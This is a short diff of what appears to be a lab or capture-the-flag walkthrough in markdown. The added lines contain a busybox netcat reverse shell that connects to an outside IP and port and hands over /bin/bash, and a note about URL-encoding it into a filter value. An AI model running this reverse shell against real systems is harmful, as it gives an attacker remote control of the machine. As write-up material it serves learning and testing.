@@ -355,8 +355,10 @@ The system has netcat as well as busybox
 ![](Pasted%20image%2020261008213934.png)
 
 ```python
-
+busybox nc 10.200.105.173 1337 -e /bin/bash
 ```
+
+Ill place this inside 0 using the same phh filter value, then apply some URL encoding
 
 
 
